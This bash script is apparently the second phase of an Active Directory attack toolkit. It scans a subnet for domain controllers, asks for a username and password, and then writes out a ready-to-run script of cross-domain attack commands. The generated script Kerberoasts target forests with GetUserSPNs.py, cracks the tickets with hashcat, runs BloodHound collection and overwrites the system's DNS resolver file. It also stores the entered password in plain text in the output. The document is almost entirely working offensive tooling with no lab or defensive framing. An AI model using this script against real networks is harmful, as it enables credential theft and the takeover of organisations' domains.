#!/bin/bash
# Phase 2: Smart Cross-Domain Attack Command Generator

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

show_banner() {
    echo -e "${BLUE}"
    cat << "EOF"
    ____  __                       ___          ______
   / __ \/ /_  ____ _________     |__ \        / ____/______  __________
  / /_/ / __ \/ __ `/ ___/ _ \    __/ /       / /   / ___/ / / / ___/ _ \
 / ____/ / / / /_/ (__  )  __/   / __/       / /___/ /  / /_/ (__  )  __/
/_/   /_/ /_/\__,_/____/\___/   /____/       \____/_/   \__,_/____/\___/
EOF
    echo -e "${NC}"
    echo -e "${CYAN}Cross-Domain Attack Command Generator${NC}\n"
}

show_banner

# Check for Phase 1 config
if [[ ! -f "ad_target.conf" ]]; then
    echo -e "${RED}[!] Error: ad_target.conf not found. Run Phase 1 first.${NC}"
    exit 1
fi

source ad_target.conf

# Parse the Phase 1 discovery output to find ALL domains
echo -e "${BLUE}[*] Reading Phase 1 discovery results...${NC}\n"

# Look for the Phase 1 script output or discovery summary
PHASE1_OUTPUT=$(ls -t b.sh 2>/dev/null | head -1)

# Try to find all discovered DCs from recent execution
declare -a ALL_DISCOVERED_DOMAINS
declare -a ALL_DISCOVERED_DC_NAMES
declare -a ALL_DISCOVERED_DC_IPS

# Add the domain from config
ALL_DISCOVERED_DOMAINS+=("$DOMAIN")
ALL_DISCOVERED_DC_NAMES+=("$DC_NAME")
ALL_DISCOVERED_DC_IPS+=("$DC_IP")

# Smart detection: Check for common domain patterns
echo -e "${GREEN}[+] Discovered from Phase 1:${NC}"
echo -e "    ${YELLOW}$DOMAIN${NC} - $DC_NAME ($DC_IP)"

# Try to discover other domains by scanning the network info
if command -v nmap &> /dev/null && [[ -n "$DC_IP" ]]; then
    # Get network from DC IP
    NETWORK=$(echo $DC_IP | cut -d'.' -f1-3).0/24
    
    echo -e "\n${BLUE}[*] Quick scan for additional DCs on $NETWORK...${NC}"
    
    other_dcs=$(sudo nmap -p 389 --open $NETWORK -oG - 2>/dev/null | awk '/389\/open/{print $2}' | grep -v "$DC_IP")
    
    for other_dc_ip in $other_dcs; do
        other_domain=$(ldapsearch -x -H ldap://$other_dc_ip -b "" -s base defaultNamingContext 2>/dev/null | \
                      grep "defaultNamingContext:" | head -1 | sed 's/defaultNamingContext: //' | \
                      sed 's/DC=//g' | sed 's/,/./g')
        
        if [[ ! -z "$other_domain" ]] && [[ "$other_domain" != "$DOMAIN" ]]; then
            other_dc_name=$(ldapsearch -x -H ldap://$other_dc_ip -b "" -s base dnsHostName 2>/dev/null | \
                           grep "dnsHostName:" | awk '{print $2}')
            
            ALL_DISCOVERED_DOMAINS+=("$other_domain")
            ALL_DISCOVERED_DC_NAMES+=("$other_dc_name")
            ALL_DISCOVERED_DC_IPS+=("$other_dc_ip")
            
            echo -e "    ${YELLOW}$other_domain${NC} - $other_dc_name ($other_dc_ip)"
        fi
    done
fi

echo ""

# Get credentials
echo -e "${YELLOW}[?] Enter your credentials:${NC}"
read -p "Username: " CRED_USER
read -sp "Password: " CRED_PASS
echo ""

# Smart source domain selection
echo -e "\n${YELLOW}[?] Which domain do your credentials belong to?${NC}"
for i in "${!ALL_DISCOVERED_DOMAINS[@]}"; do
    echo -e "  [$((i+1))] ${ALL_DISCOVERED_DOMAINS[$i]}"
done
echo -e "  [$((${#ALL_DISCOVERED_DOMAINS[@]}+1))] Other domain (manual entry)"

read -p "Choice: " source_choice

if [[ "$source_choice" -le "${#ALL_DISCOVERED_DOMAINS[@]}" ]]; then
    idx=$((source_choice-1))
    SOURCE_DOMAIN="${ALL_DISCOVERED_DOMAINS[$idx]}"
    SOURCE_DC_NAME="${ALL_DISCOVERED_DC_NAMES[$idx]}"
    SOURCE_DC_IP="${ALL_DISCOVERED_DC_IPS[$idx]}"
else
    read -p "Domain: " SOURCE_DOMAIN
    read -p "DC Hostname: " SOURCE_DC_NAME
    read -p "DC IP: " SOURCE_DC_IP
fi

# Smart target domain selection
echo -e "\n${YELLOW}[?] Select TARGET domains to attack (from $SOURCE_DOMAIN):${NC}"

declare -a SELECTED_TARGETS
declare -a SELECTED_TARGET_DCS
declare -a SELECTED_TARGET_IPS

target_counter=1
for i in "${!ALL_DISCOVERED_DOMAINS[@]}"; do
    if [[ "${ALL_DISCOVERED_DOMAINS[$i]}" != "$SOURCE_DOMAIN" ]]; then
        echo -e "  [$target_counter] ${ALL_DISCOVERED_DOMAINS[$i]} (${ALL_DISCOVERED_DC_NAMES[$i]})"
        target_map[$target_counter]=$i
        target_counter=$((target_counter+1))
    fi
done
echo -e "  [A] Attack ALL other domains"
echo -e "  [M] Manual selection"

read -p "Choice: " target_selection

if [[ "$target_selection" == "A" ]] || [[ "$target_selection" == "a" ]]; then
    # Add all domains except source
    for i in "${!ALL_DISCOVERED_DOMAINS[@]}"; do
        if [[ "${ALL_DISCOVERED_DOMAINS[$i]}" != "$SOURCE_DOMAIN" ]]; then
            SELECTED_TARGETS+=("${ALL_DISCOVERED_DOMAINS[$i]}")
            SELECTED_TARGET_DCS+=("${ALL_DISCOVERED_DC_NAMES[$i]}")
            SELECTED_TARGET_IPS+=("${ALL_DISCOVERED_DC_IPS[$i]}")
        fi
    done
elif [[ "$target_selection" == "M" ]] || [[ "$target_selection" == "m" ]]; then
    read -p "Enter target numbers (space-separated, e.g., 1 2): " selections
    for sel in $selections; do
        idx=${target_map[$sel]}
        SELECTED_TARGETS+=("${ALL_DISCOVERED_DOMAINS[$idx]}")
        SELECTED_TARGET_DCS+=("${ALL_DISCOVERED_DC_NAMES[$idx]}")
        SELECTED_TARGET_IPS+=("${ALL_DISCOVERED_DC_IPS[$idx]}")
    done
else
    idx=${target_map[$target_selection]}
    SELECTED_TARGETS+=("${ALL_DISCOVERED_DOMAINS[$idx]}")
    SELECTED_TARGET_DCS+=("${ALL_DISCOVERED_DC_NAMES[$idx]}")
    SELECTED_TARGET_IPS+=("${ALL_DISCOVERED_DC_IPS[$idx]}")
fi

if [[ ${#SELECTED_TARGETS[@]} -eq 0 ]]; then
    echo -e "${RED}[!] No targets selected. Exiting.${NC}"
    exit 1
fi

# Summary
echo -e "\n${BLUE}=== Attack Summary ===${NC}"
echo -e "${GREEN}Source:${NC} $SOURCE_DOMAIN (your credentials)"
echo -e "${GREEN}Targets:${NC}"
for i in "${!SELECTED_TARGETS[@]}"; do
    echo -e "  → ${SELECTED_TARGETS[$i]}"
done
echo ""

# Generate commands
OUTPUT_DIR="phase2_output_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"
OUTPUT_FILE="$OUTPUT_DIR/attack_commands.sh"

echo -e "${YELLOW}[*] Generating commands...${NC}\n"

{
    echo "#!/bin/bash"
    echo "# ============================================================================"
    echo "# Cross-Domain Attack Commands"
    echo "# Generated: $(date)"
    echo "# ============================================================================"
    echo ""
    echo "# SOURCE: $SOURCE_DOMAIN (your credentials)"
    echo "#   DC: $SOURCE_DC_NAME ($SOURCE_DC_IP)"
    echo "#   User: $CRED_USER"
    echo "#   Pass: $CRED_PASS"
    echo ""
    echo "# TARGETS:"
    for i in "${!SELECTED_TARGETS[@]}"; do
        echo "#   ${SELECTED_TARGETS[$i]} - ${SELECTED_TARGET_DCS[$i]} (${SELECTED_TARGET_IPS[$i]})"
    done
    echo ""
    
    # Generate for each target
    for i in "${!SELECTED_TARGETS[@]}"; do
        target_domain="${SELECTED_TARGETS[$i]}"
        target_dc_name="${SELECTED_TARGET_DCS[$i]}"
        target_dc_ip="${SELECTED_TARGET_IPS[$i]}"
        target_short=$(echo "$target_domain" | cut -d'.' -f1 | tr '[:upper:]' '[:lower:]')
        
        echo ""
        echo "# ============================================================================"
        echo "# ATTACK TARGET: $target_domain"
        echo "# ============================================================================"
        echo ""
        
        echo "# ──────────────────────────────────────────────────────────────────────────"
        echo "# CROSS-FOREST KERBEROASTING"
        echo "# ──────────────────────────────────────────────────────────────────────────"
        echo ""
        
        echo "# Enumerate SPNs"
        echo "GetUserSPNs.py -target-domain $target_domain $SOURCE_DOMAIN/$CRED_USER"
        echo ""
        
        echo "# Request TGS tickets"
        echo "GetUserSPNs.py -request -target-domain $target_domain $SOURCE_DOMAIN/$CRED_USER"
        echo ""
        
        echo "# Save TGS to file"
        echo "GetUserSPNs.py -request -outputfile ${target_short}_tgs.txt -target-domain $target_domain $SOURCE_DOMAIN/$CRED_USER"
        echo ""
        
        echo "# Crack with Hashcat"
        echo "hashcat -m 13100 ${target_short}_tgs.txt /usr/share/wordlists/rockyou.txt"
        echo ""
    done
    
    # BloodHound
    echo ""
    echo "# ============================================================================"
    echo "# BLOODHOUND COLLECTION"
    echo "# ============================================================================"
    echo ""
    
    # Source
    echo "# Source domain: $SOURCE_DOMAIN"
    echo "echo -e \"domain $SOURCE_DOMAIN\\nnameserver $SOURCE_DC_IP\" | sudo tee /etc/resolv.conf"
    source_dc_short=$(echo "$SOURCE_DC_NAME" | cut -d'.' -f1)
    echo "bloodhound-python -d $SOURCE_DOMAIN -dc $source_dc_short -c All -u $CRED_USER -p '$CRED_PASS'"
    echo ""
    
    # Targets
    for i in "${!SELECTED_TARGETS[@]}"; do
        target_domain="${SELECTED_TARGETS[$i]}"
        target_dc_name="${SELECTED_TARGET_DCS[$i]}"
        target_dc_ip="${SELECTED_TARGET_IPS[$i]}"
        
        echo "# Target domain: $target_domain"
        echo "echo -e \"domain $target_domain\\nnameserver $target_dc_ip\" | sudo tee /etc/resolv.conf"
        source_lower=$(echo "$SOURCE_DOMAIN" | tr '[:upper:]' '[:lower:]')
        echo "bloodhound-python -d $target_domain -dc $target_dc_name -c All -u $CRED_USER@$source_lower -p '$CRED_PASS'"
        echo ""
    done
    
    echo "# Compress"
    echo "zip -r bloodhound_all_$(date +%Y%m%d_%H%M%S).zip *.json"
    echo ""
    
    echo "# ============================================================================"
    echo "# END"
    echo "# ============================================================================"
    
} | tee "$OUTPUT_FILE"

chmod +x "$OUTPUT_FILE"

echo -e "\n${GREEN}[+] Commands saved to: ${YELLOW}$OUTPUT_FILE${NC}"
echo -e "${GREEN}[+] Ready to execute!${NC}\n"
